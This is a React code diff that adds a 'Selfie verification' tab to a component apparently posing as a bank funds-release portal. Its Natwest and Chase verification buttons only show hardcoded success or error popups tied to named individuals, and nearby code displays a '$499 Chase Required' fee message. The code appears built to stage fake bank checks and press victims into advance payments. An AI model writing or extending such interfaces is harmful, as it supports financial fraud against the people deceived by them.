@@ -51,6 +51,22 @@ const Tabs = () => {
     }
   };
 
+  const natwestSelfie = () => {
+    Swal.fire({
+      icon: "Error",
+      title: "Error",
+      html: "Lewis.C <br/> Selfie verification Is not completed",
+    });
+  };
+
+  const chaseSelfie = () => {
+    Swal.fire({
+      icon: "Success",
+      title: "Success",
+      html: "Lewis.F  <br/> Selfie verification Successfully completed",
+    });
+  };
+
   const checkFunds = () => {
     setShowRegion(false);
 
@@ -94,10 +110,9 @@ const Tabs = () => {
         },
         willClose: () => {
           Swal.fire({
-            html:`$499 Chase Required. 
-<br>To complete any form of transactions `,}
-            
-          );
+            html: `$499 Chase Required. 
+<br>To complete any form of transactions `,
+          });
         },
       });
     } else {
@@ -639,6 +654,13 @@ const Tabs = () => {
                 >
                   Funds Release Approval
                 </button>
+
+                <button
+                  className={activeTab === "selfie" ? "active" : ""}
+                  onClick={() => handleButtonClick("selfie")}
+                >
+                  Selfie verification
+                </button>
               </div>
             </div>
 
@@ -758,6 +780,18 @@ const Tabs = () => {
                   </div>
 
                   <button onClick={checkFunds}>Submit</button>
+                </div>
+              )}
+
+              {activeTab === "selfie" && (
+                <div className="visa-card d-block">
+                  {" "}
+                  <button className="w-100 d-block" onClick={natwestSelfie}>
+                    Natwest Bank selfie verification
+                  </button>
+                  <button className="w-100 d-block mt-4" onClick={chaseSelfie}>
+                    Chase bank Selfie verification{" "}
+                  </button>
                 </div>
               )}
 
